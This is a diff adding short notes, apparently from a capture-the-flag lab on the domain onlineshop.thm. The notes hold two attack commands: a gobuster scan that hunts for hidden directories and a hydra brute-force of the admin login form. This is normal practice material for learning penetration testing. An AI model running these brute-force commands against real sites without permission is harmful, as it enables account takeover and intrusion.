@@ -1,0 +1,7 @@
+//Using Gobuster o find hidden pages
+gobuster dir --url http://www.onlineshop.thm/ -w /usr/share/wordlists/dirbuster/directory-list.txt
+
+
+
+//Using Hydra to Find Password
+hydra -l admin -P passlist.txt www.onlineshop.thm http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
